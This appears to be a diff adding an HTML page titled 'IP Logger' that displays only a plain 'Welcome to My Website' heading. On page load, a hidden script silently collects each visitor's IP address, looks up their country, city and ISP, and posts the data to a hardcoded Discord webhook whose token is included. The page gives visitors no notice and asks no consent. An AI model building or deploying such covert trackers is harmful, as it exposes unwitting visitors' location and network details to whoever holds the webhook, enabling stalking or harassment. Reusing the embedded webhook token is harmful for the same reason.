@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Logger</title>
+</head>
+<body>
+    <h1>Welcome to My Website</h1>
+    
+    <script>
+        // Get IP address and send to Discord webhook
+        async function logIP() {
+            try {
+                // First get the IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+                
+                // Get additional info (optional)
+                const infoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
+                const locationData = await infoResponse.json();
+                
+                // Prepare data for Discord
+                const webhookURL = 'https://discord.com/api/webhooks/1382393626751008788/Y8X12gZi0J12wrIVAeTvP03Sl3fgfEaNUXSD8P_U0ZoUfeOgUfWEZTNnXE71-9F4yrFP';
+                const timestamp = new Date().toISOString();
+                
+                const embed = {
+                    title: "New Visitor",
+                    color: 0x00ff00,
+                    fields: [
+                        { name: "IP Address", value: ipAddress },
+                        { name: "Country", value: locationData.country_name || "Unknown" },
+                        { name: "City", value: locationData.city || "Unknown" },
+                        { name: "ISP", value: locationData.org || "Unknown" },
+                        { name: "Time", value: timestamp }
+                    ]
+                };
+                
+                // Send to Discord
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+                
+                console.log('IP information sent to Discord');
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+        
+        // Call the function when page loads
+        window.onload = logIP;
+    </script>
+</body>
+</html>
